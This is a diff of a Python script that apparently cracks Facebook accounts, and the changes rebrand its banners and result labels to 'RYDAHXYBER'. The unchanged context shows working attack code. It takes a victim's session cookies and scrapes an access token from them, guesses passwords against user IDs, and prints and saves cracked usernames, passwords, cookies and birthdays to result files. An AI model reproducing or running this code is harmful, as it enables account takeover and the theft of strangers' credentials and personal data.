@@ -227,9 +227,9 @@ def login_lagi334():
 	try:
 		os.system('clear')
 		banner()
-		cetak(nel('\t( ͠° ͟ʖ ͡°) salam dari binjay : [green]🇨 🇴 🇰 🇮  [white] (;´༎ຶٹ༎ຶ`)'))
+		cetak(nel('\t( ͠° ͟ʖ ͡°) WELCM 2 RYDAH TOOLS : [green]🇨 🇴 🇰 🇮  [white] (;´༎ຶٹ༎ຶ`)'))
 		asu = random.choice([m,k,h,b,u])
-		cookie=input(f'  [{h}•{x}] Cookies lu ngab :{asu} ')
+		cookie=input(f'  [{h}•{x}] ENTER COOKIES :{asu} ')
 		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
 		find_token = re.search("(EAAG\w+)", data.text)
 		ken=open(".token.txt", "w").write(find_token.group(1))
@@ -802,10 +802,10 @@ def __metode__(self, cebok, user, pasw):
                     cooz = session.cookies.get_dict()
                     coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                     if "t" in Apk:
-                        print('\r %sMETA LIVE OK %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
+                        print('\r %sRYDAHXYBER OK %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                         print(f'\r {H}Cookie   : {coki}\n')
                     elif "y" in Apk:
-                        print(f'\r %sMETA LIVE OK %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
+                        print(f'\r %sRYDAHXYBER OK %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                         print(f'\r {H}Cookie   : {coki}')
                     wrt = '[ROY-OK] %s • %s' % (user,pw)
                     ok.append(wrt)
@@ -818,7 +818,7 @@ def __metode__(self, cebok, user, pasw):
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r %sMETA LIVE CP %s               \n Username : %s\n Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))
+                        print('\r %sRYDAHXYBER CP %s               \n Username : %s\n Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))
                         wrt = '[ROY-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                         cp.append(wrt)
                         open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -828,8 +828,8 @@ def __metode__(self, cebok, user, pasw):
                         day   = ''
                         year  = ''
                     except:pass
-                    print('\r %sMETA LIVE CP %s               \n Username : %s\n Password : %s%s\n'%(K,waktu,user,pw,N))
-                    wrt = '[ROY-CP] %s • %s' % (user,pw)
+                    print('\r %sRYDAHXYBER CP %s               \n Username : %s\n Password : %s%s\n'%(K,waktu,user,pw,N))
+                    wrt = '[RYDAH CP] %s • %s' % (user,pw)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                     break
@@ -869,7 +869,7 @@ def cracktouch(idf,pwv):
 					print('\n')
 					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='AOREC-XD CP'))
+					cetak(nel(statuscp1, title='RYDAHXYBER CP'))
 					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -884,7 +884,7 @@ def cracktouch(idf,pwv):
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='AOREC-XD OK'))
+					cetak(nel(statusok1, title='RYDAHXYBER OK'))
 					ok+=1
 					break
 				elif 'ya' in taplikasi:
@@ -913,7 +913,7 @@ def cracktouch(idf,pwv):
 					print('\n')
 					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]RYDAH XYBER OK[/bold green]'))
 					ok+=1
 					break
 
@@ -952,7 +952,7 @@ def crackmbasic(idf,pwv):
 					print('\n')
 					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='AOREC-XD CP'))
+					cetak(nel(statuscp1, title='RYDAHXYBER CP'))
 					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -996,7 +996,7 @@ def crackmbasic(idf,pwv):
 					print('\n')
 					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]RYDAHXYBER OK[/bold green]'))
 					ok+=1
 					break
 			else:
